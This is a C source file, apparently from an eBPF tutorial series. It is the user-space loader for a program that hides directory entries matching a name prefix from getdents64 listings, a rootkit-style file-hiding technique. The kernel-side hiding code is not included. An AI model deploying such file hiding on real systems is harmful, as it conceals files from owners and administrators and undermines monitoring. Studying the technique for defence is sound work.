// SPDX-License-Identifier: (LGPL-2.1 OR BSD-2-Clause)
/* 24-hide: user-space loader.  Hides directory entries whose name starts with
 * the target string from getdents64 listings.  Usage: ./hide <name-prefix>
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>
#include <unistd.h>
#include <bpf/libbpf.h>
#include "hide.skel.h"

static volatile sig_atomic_t exiting;
static void sig_handler(int sig) { exiting = 1; }
static int libbpf_print_fn(enum libbpf_print_level level, const char *format, va_list args)
{
	if (level == LIBBPF_DEBUG) return 0;
	return vfprintf(stderr, format, args);
}

int main(int argc, char **argv)
{
	struct hide_bpf *skel;
	int err = 0;

	if (argc < 2) {
		fprintf(stderr, "usage: %s <name-prefix-to-hide>\n", argv[0]);
		return 1;
	}

	libbpf_set_print(libbpf_print_fn);
	signal(SIGINT, sig_handler);
	signal(SIGTERM, sig_handler);

	skel = hide_bpf__open();
	if (!skel) { fprintf(stderr, "open failed\n"); return 1; }

	strncpy((char *)skel->rodata->target_name, argv[1], 15);
	skel->rodata->target_strlen = strnlen(argv[1], 16);

	err = hide_bpf__load(skel);
	if (err) { fprintf(stderr, "load failed\n"); goto cleanup; }
	err = hide_bpf__attach(skel);
	if (err) { fprintf(stderr, "attach failed\n"); goto cleanup; }

	printf("hiding entries starting with '%s'... Ctrl-C\n", argv[1]);
	while (!exiting) sleep(1);

cleanup:
	hide_bpf__destroy(skel);
	return err < 0 ? -err : 0;
}
